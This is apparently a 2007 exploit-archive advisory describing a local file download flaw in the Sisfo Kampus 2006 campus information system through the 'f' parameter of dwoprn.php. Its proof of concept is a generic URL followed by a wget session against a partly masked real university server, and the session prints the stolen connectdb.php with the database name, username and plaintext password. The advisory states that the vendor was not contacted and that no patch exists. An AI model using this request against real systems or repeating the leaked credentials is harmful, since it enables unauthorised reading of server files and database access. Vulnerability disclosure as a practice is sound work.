@@ -1,0 +1,100 @@
+original File name : PUPET-SisfoKampus2006.txt
+
+date releases      : September 10, 2007
+
+ 
+
+Information :
+
+=========================
+
+Advisory Name: Sisfo Kampus 2006 Local File Downloaded Vulnerability
+
+Author: k-one A.K.A PUPET
+
+Website vendor : http://sisfokampus.net/
+
+Problem : All Local File can downloaded
+
+
+POC :
+
+=========================
+
+ 
+
+http://[h0sT]/[dir]/dwoprn.php?f=connectdb.php
+
+ 
+
+ 
+
+[pupet@vps ~]$ wget http://***.*****-subang.ac.id/dwoprn.php?f=connectdb.php
+
+--07:30:16--  http://***.*****-subang.ac.id/dwoprn.php?f=connectdb.php
+
+           => `dwoprn.php?f=connectdb.php'
+
+Resolving ***.*****-subang.ac.id... 203.130.***.**
+
+Connecting to siak.universitas-subang.ac.id[203.130.***.**]:80... connected.
+
+HTTP request sent, awaiting response... 200 OK
+
+Length: 292 [application/dwoprn]
+
+ 
+
+100%[====================================================================================================================================================================>] 292           --.--K/s
+
+ 
+
+07:30:22 (2.78 MB/s) - `dwoprn.php?f=connectdb.php' saved [292/292]
+
+ 
+
+[pupet@vps ~]$ cat dwoprn.php?f=connectdb.php
+
+<?php
+
+  // file: connectdb.php
+
+  // author: E. Setio Dewo, Maret 2003
+
+ 
+
+  $db_username = "t26924_siak";
+
+  $db_hostname = "localhost";
+
+  $db_password = "siakang";
+
+  $db_name = "t26924_siak";
+
+ 
+
+  $con = _connect($db_hostname, $db_username, $db_password);
+
+  $db  = _select_db($db_name, $con);
+
+ 
+
+?>
+
+Vendor Response:
+
+==============
+
+Not contacted yet
+
+ 
+
+Patch :
+
+=============
+
+No Patch Available
+
+This bugs Discover by : k-one A.K.A PUPET (Join our community at irc.indoirc.net #safana)
+
+# milw0rm.com [2007-09-10]
